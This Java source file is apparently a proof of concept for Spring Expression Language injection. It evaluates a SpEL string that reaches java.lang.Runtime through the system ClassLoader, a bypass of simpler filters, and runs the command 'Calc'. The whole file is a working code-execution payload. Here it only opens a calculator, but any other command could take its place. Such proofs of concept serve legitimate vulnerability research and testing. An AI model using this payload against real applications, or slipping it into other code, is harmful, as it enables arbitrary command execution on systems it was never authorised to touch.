package PoCAndBypass.ClassLoaderPoC;

import org.springframework.expression.Expression;
import org.springframework.expression.ExpressionParser;
import org.springframework.expression.spel.standard.SpelExpressionParser;

public class AppClassLoader {
    public static void main(String[] args) {
        String spel = "T(ClassLoader).getSystemClassLoader().loadClass(\"java.lang.Runtime\").getRuntime().exec(\"Calc\")";
        ExpressionParser parser = new SpelExpressionParser();
        Expression expression = parser.parseExpression(spel);
        System.out.println(expression.getValue());
    }
}
